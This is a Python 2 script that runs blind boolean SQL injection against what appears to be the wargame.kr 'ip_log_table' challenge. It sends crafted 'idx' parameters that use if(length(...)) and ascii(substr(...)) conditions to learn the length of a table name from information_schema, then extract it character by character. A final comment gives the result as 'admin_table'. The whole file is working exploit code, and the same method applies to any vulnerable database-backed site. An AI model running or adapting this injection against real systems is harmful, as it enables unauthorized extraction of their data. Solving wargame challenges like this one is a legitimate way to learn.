import urllib2
import urllib

baseurl = "http://wargame.kr:8080/ip_log_table/chk.php"

length = 0
row = 0

for j in range(40, 100):
    length = 0

    result = ''

    for i in range(1, 40):  # '_123456789abcdefghijklnmopqrstuvwxyz':
        print 'try length', j, i

        data = {
            "idx": "if(length((select table_name from information_schema.tables limit {},1))={},18954, 0)".format(
                str(j), str(i))
        }

        data = urllib.urlencode(data)

        # print data

        req = urllib2.Request(baseurl, data)

        content = urllib2.urlopen(req).read()

        # print content
        if content.find('1970-01-01 09:00:00') == -1:
            length = i
            print 'Length is', length
            break

    if length != 0:
        row = j
        break

    print 'Failed : find length'

if length == 0:
    print 'Failed LENGTH'
    exit(0)

print 'Find rows in information schema'

for k in range(1, length + 1):
    for i in '_123456789abcdefghijklnmopqrstuvwxyz':
        print 'try char', k, i

        data = {
            "idx": "if(ascii(substr((select table_name from information_schema.tables limit {},1),{},1))={},18954, 0)".format(
                row, str(k), ord(i))
        }

        data = urllib.urlencode(data)

        # print data

        req = urllib2.Request(baseurl, data)

        content = urllib2.urlopen(req).read()

        # print content
        if content.find('1970-01-01 09:00:00') == -1:
            result += i
            print 'Find char', result
            break

print '\n\nRESULT', result # admin_table